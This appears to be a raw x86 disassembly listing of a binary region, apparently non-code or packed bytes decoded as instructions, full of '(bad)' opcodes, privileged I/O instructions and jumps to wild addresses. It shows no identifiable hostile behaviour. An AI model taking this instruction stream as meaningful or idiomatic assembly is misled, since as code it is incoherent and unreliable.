  41c590:	add    BYTE PTR [ebx-0x16a512bb],cl
  41c596:	pusha  
  41c597:	xor    ah,bh
  41c599:	call   FWORD PTR [ebp+0x38f98a32]
  41c59f:	xchg   ebx,eax
  41c5a0:	xor    dh,BYTE PTR [edi-0x7d]
  41c5a3:	adc    edx,DWORD PTR [esi]
  41c5a5:	push   ebx
  41c5a6:	shr    BYTE PTR [edx-0x2970b078],0xc9
  41c5ad:	call   0x3e4fb9
  41c5b2:	jge    0x41c60a
  41c5b4:	rcr    BYTE PTR [eax],0xf0
  41c5b7:	adc    DWORD PTR [ecx+0x72],ecx
  41c5ba:	mov    dh,0x1d
  41c5bc:	mov    BYTE PTR [edi-0x35],cl
  41c5bf:	sub    DWORD PTR [edx-0x4f779dff],ecx
  41c5c5:	pop    ds
  41c5c6:	jecxz  0x41c5d6
  41c5c8:	add    BYTE PTR [ebx],al
  41c5ca:	(bad)  {k3}{z}
  41c5cf:	mov    dh,0x2
  41c5d1:	add    BYTE PTR [edx+0x73],ah
  41c5d4:	push   edx
  41c5d5:	push   esi
  41c5d6:	(bad)  
  41c5d7:	ror    esp,cl
  41c5d9:	mov    bl,bl
  41c5db:	dec    ebx
  41c5dc:	sahf   
  41c5dd:	xor    BYTE PTR [ebx+0x76241c49],ch
  41c5e3:	cmp    cl,BYTE PTR [eax]
  41c5e5:	data16 fld TBYTE PTR [esi]
  41c5e8:	in     al,0x17
  41c5ea:	arpl   dx,ax
  41c5ec:	jmp    esi
  41c5ee:	add    BYTE PTR [edi-0x1e00003f],ch
  41c5f4:	xchg   ebx,edi
  41c5f6:	or     al,0xe0
  41c5f8:	leave  
  41c5f9:	add    DWORD PTR [eax],eax
  41c5fb:	(bad)  
  41c5fc:	stc    
  41c5fd:	fisttp DWORD PTR [ebx*8+0x620005b1]
  41c604:	scas   eax,DWORD PTR es:[edi]
  41c605:	inc    ebx
  41c606:	add    al,0x62
  41c608:	ret    0x1fff
  41c60b:	ins    DWORD PTR es:[edi],dx
  41c60c:	ds mov esp,0x7ec275fe
  41c612:	cmp    al,0x5e
  41c614:	mov    bh,0x85
  41c616:	lds    esp,FWORD PTR [ebx-0x3e]
  41c619:	push   ebp
  41c61b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c61c:	mov    esi,0x2dde0d04
  41c621:	push   es
  41c622:	add    BYTE PTR [edx-0x20],ah
  41c625:	mov    esi,eax
  41c627:	push   ebp
  41c628:	xor    eax,0xc23dffd0
  41c62d:	or     BYTE PTR [ebx-0x15b82],0x62
  41c634:	pop    edx
  41c635:	mov    dh,0x57
  41c637:	arpl   dx,ax
  41c639:	jbe    0x41c62a
  41c63b:	or     bl,cl
  41c63d:	xchg   DWORD PTR [esi+0x16],ebx
  41c640:	rcr    BYTE PTR ds:0xb4dc7808,1
  41c646:	sbb    DWORD PTR [eax+0x31],esp
  41c649:	fild   DWORD PTR [ecx+0xa]
  41c64c:	pop    edx
  41c64d:	sub    edx,edx
  41c64f:	hlt    
  41c650:	iret   
  41c651:	jmp    0xc160c6d0
  41c656:	nop
  41c657:	cmp    al,0x62
  41c659:	fldenv [esp+eax*8+0x6e]
  41c65d:	popa   
  41c65e:	imul   eax,DWORD PTR [edx+eiz*2],0xd9178fd9
  41c665:	sbb    al,0xce
  41c667:	out    0x14,eax
  41c669:	sub    DWORD PTR [edx+edx*2-0x54232fed],esi
  41c670:	fs sbb edx,ebp
  41c673:	mov    ch,ch
  41c675:	dec    esi
  41c676:	jg     0x41c69d
  41c678:	ins    DWORD PTR es:[edi],dx
  41c679:	sub    eax,0xdd160da6
  41c67e:	stos   WORD PTR es:[edi],ax
  41c680:	jno    0x41c6d0
  41c682:	cmp    esi,ebx
  41c684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c685:	ss popa 
  41c687:	aas    
  41c688:	push   ds
  41c689:	stc    
  41c68a:	aas    
  41c68b:	add    bl,BYTE PTR [edx]
  41c68d:	adc    al,0xd2
  41c68f:	cmp    BYTE PTR [esi+0x5e],cl
  41c692:	adc    eax,0xcc9215e8
  41c697:	add    esp,DWORD PTR [edx-0x27]
  41c69a:	rcl    DWORD PTR [ecx-0x7f5d2fab],0xb1
  41c6a1:	cmc    
  41c6a2:	inc    ecx
  41c6a3:	fwait
  41c6a4:	sbb    BYTE PTR [edx-0x6c],0x2
  41c6a8:	shl    ebx,1
  41c6aa:	pop    esp
  41c6ab:	xchg   edi,eax
  41c6ac:	and    DWORD PTR [ecx-0x6f9dfc17],0xd9620383
  41c6b6:	add    BYTE PTR [ecx-0x52e9100],al
  41c6bc:	outs   dx,BYTE PTR ds:[esi]
  41c6bd:	loop   0x41c729
  41c6bf:	and    al,0x31
  41c6c1:	popa   
  41c6c2:	fld    DWORD PTR [eax]
  41c6c4:	push   edx
  41c6c5:	gs pusha 
  41c6c7:	push   esp
  41c6c8:	or     eax,0x5446256
  41c6cd:	push   es
  41c6ce:	pop    ds
  41c6cf:	mov    ?,WORD PTR [ebp-0x3]
  41c6d2:	repnz add ecx,ebp
  41c6d5:	popa   
  41c6d6:	rcl    esi,0x30
  41c6d9:	mov    bh,0xcd
  41c6db:	test   DWORD PTR [ecx],ebp
  41c6dd:	fsubr  QWORD PTR [ebx-0x40]
  41c6e0:	ins    DWORD PTR es:[edi],dx
  41c6e1:	mov    eax,ds:0xa1da074b
  41c6e6:	xor    al,0x8a
  41c6e8:	ins    DWORD PTR es:[edi],dx
  41c6e9:	mov    ebp,0x61e901e6
  41c6ee:	xchg   dl,ch
  41c6f0:	call   0x65cfa056
  41c6f5:	(bad)  
  41c6f8:	call   0xa95a285e
  41c6fd:	pop    esi
  41c6fe:	dec    edx
  41c6ff:	div    DWORD PTR [edx+0x42]
  41c702:	cmc    
  41c703:	adc    al,0x72
  41c705:	addr16 pop eax
  41c707:	call   0x43a3f8f1
  41c70c:	fst    QWORD PTR [ecx]
  41c70e:	bound  edx,QWORD PTR [ebp+ecx*1+0xe]
  41c712:	or     dl,cl
  41c714:	shl    DWORD PTR [ecx+eiz*4-0x712216ff],1
  41c71b:	or     esp,DWORD PTR [ebp+0x0]
  41c71e:	xor    al,0xce
  41c720:	sti    
  41c721:	jmp    0x696631fa
  41c726:	data16 fld DWORD PTR [eax]
  41c729:	bound  edx,QWORD PTR [ebx]
  41c72b:	pusha  
  41c72c:	dec    esp
  41c72d:	aad    0x79
  41c72f:	sar    DWORD PTR [edx+0x0],0x93
  41c733:	fiadd  DWORD PTR [eax]
  41c735:	inc    esi
  41c736:	push   ecx
  41c737:	loope  0x41c78c
  41c739:	add    ecx,edx
  41c73b:	push   edi
  41c73c:	std    
  41c73d:	adc    BYTE PTR [ecx],bl
  41c73f:	outs   dx,BYTE PTR ds:[esi]
  41c740:	xor    al,al
  41c742:	and    eax,0xc78d0253
  41c747:	mov    ch,0xb
  41c749:	push   eax
  41c74a:	and    ebx,ebx
  41c74c:	push   ecx
  41c74d:	lea    eax,[edi+0xb011fc1]
  41c753:	fiadd  DWORD PTR [ebx-0x4d5298b4]
  41c759:	add    ebx,edi
  41c75b:	fld    DWORD PTR [eax+0x4852fa50]
  41c761:	and    al,0xa7
  41c763:	pop    eax
  41c764:	int    0xff
  41c766:	ins    BYTE PTR es:[edi],dx
  41c767:	out    0x8,al
  41c769:	adc    bl,bh
  41c76b:	fnstcw WORD PTR [edi-0x40]
  41c76e:	(bad)  
  41c76f:	cmc    
  41c770:	xchg   DWORD PTR [edi+eiz*4-0x23],eax
  41c774:	push   eax
  41c775:	lea    eax,[edi]
  41c777:	mov    dh,0x17
  41c779:	push   eax
  41c77a:	enter  0x8828,0x84
  41c77e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c77f:	imul   edi,ebx,0x298b00ff
  41c785:	(bad)  
  41c786:	je     0x41c7ef
  41c788:	sar    esp,0x15
  41c78b:	ja     0x41c776
  41c78d:	inc    eax
  41c78e:	add    BYTE PTR [esi],al
  41c790:	call   0x440d:0xe56774fc
  41c797:	aaa    
  41c798:	rcr    DWORD PTR [ebx],0xff
  41c79b:	xchg   ch,cl
  41c79d:	or     eax,DWORD PTR [eax+0x4b]
  41c7a0:	pop    edx
  41c7a1:	std    
  41c7a2:	add    al,0x76
  41c7a4:	lds    esi,FWORD PTR [edx]
  41c7a6:	pop    edi
  41c7a7:	push   ebx
  41c7a8:	add    eax,0x6562e851
  41c7ad:	push   esp
  41c7ae:	add    BYTE PTR [edx+0x37],ah
  41c7b1:	cmp    eax,0xe9066108
  41c7b6:	pop    ss
  41c7b7:	imul   ecx,DWORD PTR [edx+0x3ed74034],0xc2627fe4
  41c7c1:	dec    DWORD PTR [edi-0x19]
  41c7c4:	ds in  al,0x1b
  41c7c7:	arpl   dx,ax
  41c7c9:	dec    DWORD PTR [edi+0x7a]
  41c7cc:	sar    edi,0xff
  41c7cf:	loop   0x41c7ec
  41c7d1:	adc    eax,esp
  41c7d3:	push   ecx
  41c7d4:	cmp    bh,0x88
  41c7d7:	out    0xd6,al
  41c7d9:	sbb    BYTE PTR [ebx],al
  41c7db:	(bad)
  41c7e0:	(bad)  
  41c7e1:	or     al,0xff
  41c7e3:	aad    0xc2
  41c7e5:	(bad)  
  41c7e8:	bound  esp,QWORD PTR [edi+0x398500dc]
  41c7ee:	sbb    al,0x24
  41c7f0:	push   esi
  41c7f1:	aas    
  41c7f2:	stos   DWORD PTR es:[edi],eax
  41c7f3:	or     esp,DWORD PTR [ebp+0x3f]
  41c7f6:	add    bh,dh
  41c7f8:	lods   eax,DWORD PTR ds:[esi]
  41c7f9:	retf   
  41c7fa:	xchg   ebx,eax
  41c7fb:	add    ecx,esi
  41c7fd:	ror    DWORD PTR [esi+ebx*2+0x3f],0x38
  41c802:	rcr    DWORD PTR [eax-0x1d],0x7e
  41c806:	add    al,0x3
  41c808:	(bad)
  41c80d:	inc    ecx
  41c80e:	cdq    
  41c80f:	mul    DWORD PTR [esi-0x3e]
  41c812:	call   DWORD PTR [eax+0xf]
  41c815:	in     al,dx
  41c816:	dec    edi
  41c817:	push   0x41279a
  41c81c:	fstp   DWORD PTR [ecx-0x5aa2270d]
  41c822:	xor    edx,DWORD PTR [edx]
  41c824:	mov    ds:0x907ee9d9,al
  41c829:	mov    ch,0xe
  41c82b:	inc    eax
  41c82c:	bound  esp,QWORD PTR [eax-0x2c]
  41c82f:	mov    ds:0x9eea15ca,eax
  41c834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c835:	pop    eax
  41c836:	ret    0x5ef7
  41c839:	push   edi
  41c83a:	repnz add al,0x62
  41c83d:	fnstenv [eax-0x5ab910e]
  41c843:	add    al,0x62
  41c845:	fstp   DWORD PTR [ebx+0x43]
  41c848:	data16 fcmovbe st,st(5)
  41c84b:	test   BYTE PTR [eax],0xe2
  41c84e:	dec    ebp
  41c84f:	out    dx,al
  41c850:	add    al,0x71
  41c852:	loop   0x41c8a6
  41c854:	inc    ebx
  41c855:	pop    esi
  41c856:	(bad)  
  41c858:	add    esp,DWORD PTR [edx+0x46]
  41c85b:	jmp    0x41c7e3
  41c85d:	push   0x7c30e6d5
  41c862:	les    esp,FWORD PTR [edx-0x16142a01]
  41c868:	add    edx,DWORD PTR [esi-0x1a]
  41c86b:	outs   dx,BYTE PTR ds:[esi]
  41c86c:	push   ecx
  41c86d:	pop    edx
  41c86e:	sub    BYTE PTR [edi-0x21ba40aa],dh
  41c874:	js     0x41c89c
  41c876:	fst    QWORD PTR [ecx]
  41c878:	das    
  41c879:	push   eax
  41c87a:	int3   
  41c87b:	cli    
  41c87c:	and    ch,0x51
  41c87f:	in     al,0xde
  41c881:	push   esi
  41c882:	fsubr  DWORD PTR [edx+0x56dc9786]
  41c888:	pop    ecx
  41c889:	test   BYTE PTR [eax],al
  41c88b:	jmp    0x65a02a93
  41c890:	fistp  WORD PTR [ebx-0x28]
  41c893:	jmp    0x1c86529b
  41c898:	add    eax,0x9bb96062
  41c89d:	sbb    DWORD PTR [ebp+0x0],edi
  41c8a0:	mov    dh,0x8
  41c8a2:	inc    ecx
  41c8a3:	add    BYTE PTR [esp+esi*2],cl
  41c8a6:	xlat   BYTE PTR ds:[ebx]
  41c8a7:	pop    ecx
  41c8a8:	in     eax,0x4d
  41c8aa:	fidivr WORD PTR [esi]
  41c8ac:	nop
  41c8ad:	ficom  WORD PTR [esi+ecx*8-0x269eff18]
  41c8b4:	xchg   DWORD PTR [edi-0x16bc2627],ebx
  41c8ba:	popa   
  41c8bb:	push   esi
  41c8bc:	rol    BYTE PTR [ecx],0x78
  41c8bf:	aas    
  41c8c0:	adc    eax,0x1cf55564
  41c8c5:	sbb    BYTE PTR [esi-0x4745afdd],ch
  41c8cb:	out    0xf8,eax
  41c8cd:	clc    
  41c8ce:	mov    eax,ds:0x4b2985d9
  41c8d3:	xor    ah,BYTE PTR [ebx+0x10]
  41c8d6:	stos   BYTE PTR es:[edi],al
  41c8d7:	adc    eax,0x59f5bd13
  41c8dc:	clc    
  41c8dd:	aad    0x3a
  41c8df:	xor    BYTE PTR cs:[eax],ah
  41c8e2:	adc    DWORD PTR [edx+0x4c],0xffffffa5
  41c8e6:	imul   ebx,DWORD PTR [eax-0x3],0x8de592eb
  41c8ed:	mov    ch,0xa5
  41c8ef:	sbb    bh,BYTE PTR [edx+0xd9610c]
  41c8f5:	add    DWORD PTR [edi],ebx
  41c8f7:	ret    
  41c8f8:	cli    
  41c8f9:	push   es
  41c8fa:	sub    ah,BYTE PTR [esi]
  41c8fc:	and    eax,0x7ff9c499
  41c901:	hlt    
  41c902:	addr16 inc esi
  41c904:	pop    ss
  41c905:	pop    esp
  41c906:	in     eax,0xf6
  41c908:	shr    cl,0x61
  41c90b:	fnstcw WORD PTR [ecx+0xd95ec7]
  41c911:	rol    DWORD PTR [eax+0xcefac4],0xed
  41c918:	gs and al,0x0
  41c91b:	mov    ebx,0x900000d5
  41c920:	(bad)  [ecx-0x781690ac]
  41c926:	inc    esp
  41c927:	pop    edi
  41c928:	fst    QWORD PTR [eax-0x73]
  41c92b:	xlat   BYTE PTR ds:[ebx]
  41c92c:	mov    ecx,0xd63b010f
  41c931:	call   0xfcc0a5c0
  41c936:	test   DWORD PTR [ebx],ecx
  41c938:	ror    BYTE PTR [esi+0x6e95bfc0],1
  41c93e:	or     ch,al
  41c940:	xchg   ebp,eax
  41c941:	mov    DWORD PTR gs:[edi+0xb010bb9],ecx
  41c948:	(bad)  
  41c949:	mov    bl,0xee
  41c94b:	cli    
  41c94c:	aad    0x0
  41c94e:	lea    edi,[edi-0x47]
  41c951:	sbb    DWORD PTR [ebx],eax
  41c953:	or     edx,esi
  41c955:	mov    BYTE PTR [eax],bl
  41c957:	retf   
  41c958:	push   cs
  41c959:	jo     0x41c955
  41c95b:	jo     0x41c935
  41c95d:	sub    eax,0x478825f7
  41c963:	(bad)  
  41c964:	and    eax,0xd5f5488
  41c969:	jmp    0x1185c1a
  41c96e:	test   BYTE PTR [ebx+0x9],bh
  41c971:	inc    edx
  41c972:	(bad)  
  41c973:	jmp    FWORD PTR [ecx-0x2e28758d]
  41c979:	inc    eax
  41c97a:	call   0xfb796f7f
  41c97f:	(bad)  
  41c980:	clc    
  41c981:	push   esp
  41c982:	rol    DWORD PTR [eax+ecx*1],0x7c
  41c986:	or     esi,DWORD PTR [edx-0x6b]
  41c989:	les    edi,FWORD PTR [ebx-0x172bed9a]
  41c98f:	and    cl,BYTE PTR [ebp-0x2b]
  41c992:	add    BYTE PTR [ecx+0x13e0fc62],cl
  41c998:	or     BYTE PTR [edx+esi*2+0x4fb84643],dh
  41c99f:	push   0x5e
  41c9a1:	cmp    eax,0xb2e6237c
  41c9a6:	(bad)  
  41c9a7:	push   DWORD PTR [edx-0x7ddc73db]
  41c9ad:	mov    cl,0xff
  41c9af:	(bad)  
  41c9b0:	cmp    dl,dl
  41c9b2:	adc    al,0xfd
  41c9b4:	cmp    eax,0x58e7c83d
  41c9b9:	mov    dl,0xff
  41c9bb:	(bad)  
  41c9bc:	mov    edx,0x62441c8a
  41c9c1:	inc    edi
  41c9c2:	or     eax,DWORD PTR [eax+0x70]
  41c9c5:	repnz add al,0x5d
  41c9c8:	mov    ah,0xd5
  41c9ca:	jp     0x41c98c
  41c9cc:	test   eax,0x5ef7bc31
  41c9d1:	mov    dl,0xff
  41c9d3:	shl    DWORD PTR [esi-0x4e],0x7c
  41c9d7:	or     al,BYTE PTR [edx]
  41c9d9:	pushf  
  41c9da:	cmp    eax,DWORD PTR [eax]
  41c9dc:	cli    
  41c9dd:	pop    es
  41c9de:	push   esi
  41c9df:	inc    DWORD PTR [eax]
  41c9e1:	in     eax,0x33
  41c9e3:	fcmovnu st,st(7)
  41c9e5:	dec    ecx
  41c9e6:	jbe    0x41c9e7
  41c9e8:	jmp    ecx
  41c9ea:	frstor [eax-0x4dd998]
  41c9f0:	shl    BYTE PTR [ecx],0x90
  41c9f3:	push   eax
  41c9f4:	push   0x3b5baa
  41c9f9:	jmp    0xae1abee2
  41c9fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ff:	xor    edx,DWORD PTR [edx]
  41ca01:	and    dh,BYTE PTR [edx-0x30623369]
  41ca07:	mov    ds:0xf9e1688,eax
  41ca0c:	jmp    0xf6b0a33a
  41ca11:	loop   0x41c9d5
  41ca13:	in     eax,dx
  41ca14:	xor    DWORD PTR ds:0x112fa304,edx
  41ca1a:	shl    BYTE PTR [ebx],1
  41ca1c:	add    BYTE PTR [edx-0x27],ah
  41ca1f:	jmp    0x675dbc07
  41ca24:	lods   eax,DWORD PTR ds:[esi]
  41ca25:	imul   ecx,DWORD PTR [edi-0xc],0xe8dd9fad
  41ca2c:	das    
  41ca2d:	mov    dl,BYTE PTR [esp+edi*8-0x61]
  41ca31:	mov    edx,0x5178ea1d
  41ca36:	jmp    0x9bea:0x1dcaa450
  41ca3d:	cvtpi2ps xmm5,mm1
  41ca40:	add    ebx,esi
  41ca42:	cwde   
  41ca43:	cmc    
  41ca44:	in     al,0x0
  41ca46:	push   ds
  41ca47:	cmovns esp,DWORD PTR [edx+ecx*4+0x6102ea1d]
  41ca4f:	mov    ebp,0x2f623fce
  41ca54:	mov    edx,0xfc2550a6
  41ca59:	inc    ebx
  41ca5a:	bound  edx,QWORD PTR [ebx+eiz*8+0x4]
  41ca5e:	popa   
  41ca5f:	mov    ebp,0x5c623fce
  41ca64:	and    eax,0xf3f422f8
  41ca69:	add    cl,BYTE PTR [esp+ebx*2+0x7952f82a]
  41ca70:	xchg   ecx,eax
  41ca71:	mov    ebx,0xa6ea1d3a
  41ca76:	push   eax
  41ca77:	sbb    eax,edi
  41ca79:	inc    ebx
  41ca7a:	bound  ebx,QWORD PTR [esi+0x2e]
  41ca7d:	inc    edi
  41ca7e:	or     al,0xd8
  41ca80:	pop    esp
  41ca81:	les    ecx,FWORD PTR [edx]
  41ca83:	fwait
  41ca84:	in     eax,0x3
  41ca86:	sbb    eax,0x5ec100b5
  41ca8b:	fld    DWORD PTR [eax]
  41ca8d:	call   0xc692:0xdac5232
  41ca94:	sti    
  41ca95:	jmp    0xe1871cc9
  41ca9a:	and    al,0x52
  41ca9c:	stc    
  41ca9d:	mov    eax,fs:0x61ac84d4
  41caa3:	fld    DWORD PTR [eax]
  41caa5:	push   0xffffff81
  41caa7:	aad    0x0
  41caa9:	rol    BYTE PTR [eax],0xbb
  41caac:	(bad)  
  41caad:	sti    
  41caae:	jmp    0xc87ea77e
  41cab3:	jne    0x41caa2
  41cab5:	cmp    al,0x29
  41cab7:	jb     0x41ca8e
  41cab9:	cmp    al,0x37
  41cabb:	jb     0x41ca9a
  41cabd:	cs mov dl,0xc8
  41cac0:	shr    DWORD PTR [edi-0x50233716],1
  41cac6:	jmp    0x41cac0
  41cac8:	fsubr  DWORD PTR [edi+0x13357e8]
  41cace:	outs   dx,BYTE PTR ds:[esi]
  41cacf:	cmp    al,0xd5
  41cad1:	xchg   DWORD PTR [edi],esi
  41cad3:	mov    esp,0xd551094d
  41cad8:	sbb    al,BYTE PTR [ecx]
  41cada:	jmp    0x1fc96157
  41cadf:	leave  
  41cae0:	std    
  41cae1:	push   ss
  41cae2:	jmp    0xb6022848
  41cae7:	xchg   esi,eax
  41cae8:	aam    0xb2
  41caea:	sub    ah,al
  41caec:	mov    esi,0x1181b500
  41caf1:	jne    0x41cab1
  41caf3:	mov    DWORD PTR [ebp+0xa],ecx
  41caf6:	mov    cl,0x72
  41caf8:	and    BYTE PTR [ecx-0x1824ee5a],al
  41cafe:	mov    ah,0x28
  41cb00:	sub    eax,0x62e000d
  41cb05:	and    eax,0x8a2dfb14
  41cb0a:	dec    edi
  41cb0b:	and    DWORD PTR [edx+0x8],0xffffff85
  41cb0f:	add    BYTE PTR [edx-0x26],bh
  41cb12:	jg     0x41cad4
  41cb14:	es sbb eax,0xe96744f3
  41cb1a:	(bad)  
  41cb1b:	jae    0x41cb6f
  41cb1d:	int3   
  41cb1e:	mov    ah,0x4c
  41cb20:	ror    DWORD PTR [di],1
  41cb23:	mov    bh,0x37
  41cb25:	mov    ecx,0xc58c031d
  41cb2a:	sub    ah,0x3f
  41cb2d:	xor    BYTE PTR [eax],al
  41cb2f:	add    DWORD PTR [ebx],edi
  41cb31:	ficom  DWORD PTR [eax+0x51]
  41cb34:	into   
  41cb35:	add    DWORD PTR ds:0x3c4ed344,esp
  41cb3b:	add    BYTE PTR [ebx+0x47],cl
  41cb3e:	mov    esp,0x504f3675
  41cb43:	and    al,0xeb
  41cb45:	popa   
  41cb46:	repnz push ss
  41cb48:	or     bl,dl
  41cb4a:	jmp    0x3d459059
  41cb4f:	add    ah,al
  41cb51:	fadd   st,st(2)
  41cb53:	inc    edi
  41cb54:	aas    
  41cb55:	fiadd  DWORD PTR [eax+0xef709fb]
  41cb5b:	mov    edi,DWORD PTR [esi-0xe7c1c3f]
  41cb61:	fld    DWORD PTR [eax]
  41cb63:	mov    ebp,DWORD PTR [ebx]
  41cb65:	inc    esi
  41cb66:	test   BYTE PTR [edi],0x46
  41cb69:	sbb    esi,edi
  41cb6b:	dec    DWORD PTR [esp+ebx*1+0x5af05d5b]
  41cb72:	mov    edi,0xd9ba0028
  41cb77:	add    dl,al
  41cb79:	(bad)  
  41cb7a:	(bad)  [ecx-0x46b9dbc]
  41cb80:	cmp    BYTE PTR [esi+0xc53509f],0x67
  41cb87:	js     0x41cc00
  41cb89:	outs   dx,BYTE PTR ds:[esi]
  41cb8a:	dec    ebx
  41cb8b:	mov    al,0x82
  41cb8d:	xchg   ebp,eax
  41cb8e:	mov    esi,0xb060207b
  41cb93:	push   ebp
  41cb95:	sbb    al,0x0
  41cb97:	dec    DWORD PTR [edi+eiz*8]
  41cb9a:	fdivr  st,st(6)
  41cb9c:	jmp    DWORD PTR [edx+0x3b]
  41cb9f:	sbb    BYTE PTR [eax],dl
  41cba1:	jnp    0x41cbd7
  41cba3:	(bad)  
  41cba4:	jmp    DWORD PTR [edx+0x4b]
  41cba7:	std    
  41cba8:	sbb    BYTE PTR [edx-0x35],0xf4
  41cbac:	sbb    DWORD PTR [ecx-0x4e],0x7d89ffff
  41cbb3:	hlt    
  41cbb4:	test   BYTE PTR [ecx-0x4e],dl
  41cbb7:	(bad)  
  41cbb8:	(bad)  
  41cbb9:	out    dx,eax
  41cbba:	sbb    ch,BYTE PTR [ebp-0x30c18b0]
  41cbc0:	dec    edi
  41cbc1:	mov    eax,0xdbcd7892
  41cbc6:	(bad)  
  41cbc7:	loopne 0x41cbf4
  41cbc9:	or     cl,BYTE PTR [esi-0x1]
  41cbcc:	jmp    DWORD PTR [edx+0x36]
  41cbcf:	ror    BYTE PTR [esi+eiz*8],0xd9
  41cbd3:	(bad)  
  41cbd4:	jmp    DWORD PTR [edx+0x7f]
  41cbd7:	jb     0x41cc1d
  41cbd9:	add    BYTE PTR [edx-0x7e],ch
  41cbdc:	sbb    edi,edi
  41cbde:	call   0x641e63df
  41cbe3:	mov    dl,0xff
  41cbe5:	and    DWORD PTR [edx],0xffffffcc
  41cbe8:	jnp    0x41cc3a
  41cbea:	arpl   WORD PTR [edx+0x73e750ff],si
  41cbf0:	test   DWORD PTR [edi+0x38],0xbacd78b0
  41cbf7:	fnstenv [eax]
  41cbf9:	add    ah,BYTE PTR [edx-0x27]
  41cbfc:	gs ret 
  41cbfe:	pop    bp
  41cc00:	aam    0x2
  41cc02:	(bad)  
  41cc03:	fstp   DWORD PTR [esi+0x4d]
  41cc06:	pop    edx
  41cc07:	das    
  41cc08:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc0a:	pop    ss
  41cc0b:	aad    0xb6
  41cc0d:	mov    edx,0xb49db154
  41cc12:	mov    esp,es
  41cc14:	gs ret 
  41cc16:	push   esi
  41cc17:	pop    esi
  41cc18:	or     al,0x5
  41cc1a:	(bad)  
  41cc1b:	fldcw  WORD PTR [eax+ecx*2+0x3e]
  41cc1f:	in     al,dx
  41cc20:	cmp    DWORD PTR [edi+0xc1a5692],ecx
  41cc26:	jp     0x41cba9
  41cc28:	shl    BYTE PTR [ebx+0x13a95d5e],0xe1
  41cc2f:	shr    al,cl
  41cc31:	add    esp,DWORD PTR [edx+0x56]
  41cc34:	and    eax,0xf32969e8
  41cc39:	pop    edx
  41cc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc3b:	fist   DWORD PTR [ecx]
  41cc3d:	add    al,0x0
  41cc3f:	(bad)  
  41cc40:	fldcw  WORD PTR [ecx]
  41cc42:	xor    al,0xdb
  41cc44:	sbb    al,0xc6
  41cc46:	xor    ebx,ebx
  41cc48:	adc    dh,ch
  41cc4a:	stos   DWORD PTR es:[edi],eax
  41cc4b:	jo     0x41cc9d
  41cc4d:	jmp    0xce5ea955
  41cc52:	out    0xe0,eax
  41cc54:	cwde   
  41cc55:	fiadd  DWORD PTR [edi+0x3e9d8fe]
  41cc5b:	jmp    0x41cc89
  41cc5d:	push   es
  41cc5e:	add    bl,ah
  41cc60:	cmp    al,0xe
  41cc62:	cld    
  41cc63:	in     eax,dx
  41cc64:	push   es
  41cc65:	das    
  41cc66:	(bad)  
  41cc67:	sbb    eax,0x500a3f58
  41cc6c:	icebp  
  41cc6d:	outs   dx,BYTE PTR ds:[esi]
  41cc6e:	add    eax,0xef00c0e3
  41cc73:	ja     0x41cc59
  41cc75:	aaa    
  41cc76:	sub    ebp,DWORD PTR [ecx-0x20]
  41cc79:	repnz test al,0x65
  41cc7c:	les    esi,FWORD PTR [edx+esi*8-0x3c]
  41cc80:	xchg   ebx,eax
  41cc81:	jmp    DWORD PTR [eax]
  41cc83:	in     eax,0xc1
  41cc85:	add    bl,BYTE PTR [edx+0x720cb0fb]
  41cc8b:	lahf   
  41cc8c:	dec    esi
  41cc8d:	inc    ecx
  41cc8e:	out    0xe6,eax
  41cc90:	pop    ss
  41cc91:	and    eax,0x2b0e4d1
  41cc96:	arpl   WORD PTR [edx],si
  41cc98:	std    
  41cc99:	sub    BYTE PTR [ebx-0x5a],dh
  41cc9c:	or     DWORD PTR [ebp+0x5],eax
  41cc9f:	jns    0x41cc98
  41cca1:	add    DWORD PTR [ebx],ebx
  41cca3:	add    BYTE PTR [esi+0x66054450],bl
  41cca9:	pop    ebx
  41ccaa:	dec    esp
  41ccab:	or     eax,0x34c0584e
  41ccb0:	push   0x520d44e2
  41ccb5:	mov    dl,0xd
  41ccb7:	bound  ecx,QWORD PTR [edx+edx*2]
  41ccba:	enter  0xcd91,0x79
  41ccbe:	add    ecx,ebp
  41ccc0:	out    0x16,al
  41ccc2:	and    eax,0x2526dcc5
  41ccc7:	leave  
  41ccc8:	rcl    BYTE PTR ds:0x29499109,cl
  41ccce:	add    ch,cl
  41ccd0:	in     al,0x26
  41ccd2:	and    eax,0x879adcd1
  41ccd7:	and    eax,0xb589e2fa
  41ccdc:	add    eax,0xfda589f3
  41cce1:	push   es
  41cce2:	xchg   BYTE PTR [ebx],bh
  41cce4:	dec    edx
  41cce5:	out    0x87,eax
  41cce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cce8:	std    
  41cce9:	test   BYTE PTR [ecx+0x33bb0f00],0x8b
  41ccf0:	(bad)  
  41ccf1:	mov    edx,0xbaff8917
  41ccf6:	aaa    
  41ccf7:	jmp    0x41cca9
  41ccf9:	push   ebx
  41ccfa:	inc    edi
  41ccfb:	and    al,0xaf
  41ccfd:	outs   dx,BYTE PTR ds:[esi]
  41ccfe:	fimul  WORD PTR [edi-0x36]
  41cd01:	(bad)  
  41cd02:	and    DWORD PTR [edi+ebx*4-0x62],0xdf0082fb
  41cd0a:	mov    edx,0x12100037
  41cd0f:	and    eax,0x250a1030
  41cd14:	sbb    BYTE PTR [eax],al
  41cd16:	sbb    ah,BYTE PTR ds:0x6e95fe2c
  41cd1c:	add    al,0xe
  41cd1e:	mov    ebp,DWORD PTR [esi+0x4]
  41cd21:	dec    BYTE PTR [ebp+0x29060b6e]
  41cd27:	and    eax,0xf8eca328
  41cd2c:	jmp    DWORD PTR [esp+esi*2]
  41cd2f:	adc    eax,0x31ea0b85
  41cd34:	lea    eax,[ebp+0x5f54881d]
  41cd3a:	mov    ch,0x88
  41cd3c:	add    DWORD PTR [ecx+0x78],edi
  41cd3f:	dec    ebx
  41cd40:	or     al,0xc8
  41cd42:	gs cld 
  41cd44:	je     0x41cd8a
  41cd46:	mov    ch,0x2c
  41cd48:	add    edx,DWORD PTR [ebx*2+0x5d1408f6]
  41cd4f:	pop    ecx
  41cd50:	(bad)  
  41cd51:	xchg   esp,eax
  41cd52:	js     0x41cd3c
  41cd54:	pop    esi
  41cd55:	xchg   BYTE PTR [ecx],ch
  41cd57:	and    eax,0xf91be328
